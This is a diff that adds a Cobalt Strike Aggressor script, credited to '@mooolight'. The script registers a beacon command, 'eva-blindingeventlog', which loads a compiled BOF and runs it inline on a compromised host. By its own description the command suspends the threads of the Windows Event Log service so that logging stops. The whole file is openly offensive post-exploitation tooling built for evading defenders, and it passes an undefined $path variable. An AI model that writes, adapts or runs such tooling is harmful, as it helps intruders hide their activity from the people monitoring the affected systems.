@@ -1,0 +1,24 @@
+# author @mooolight
+
+beacon_command_register(
+	"eva-blindingeventlog", "Interacting with the Event log service process to suspend logging.",
+	"INFO:\nLocate the crucial threads responsible for processing incoming events and then proceeds to suspend these threads, which halts the logging process.\n\n" .
+	"ARGUMENTS:\n[<None>]: No argument needed.\n\n\n\n" .
+	"USAGE:\neva-blindingeventlog\n\n" .
+	"EXAMPLES:\neva-blindingeventlog\n\n");
+
+alias eva-blindingeventlog {
+    $bid = $1;
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("eva-blindingeventlog-bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "", $path);
+
+    blog($bid, "Interacting with the Event log service process to suspend logging.");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
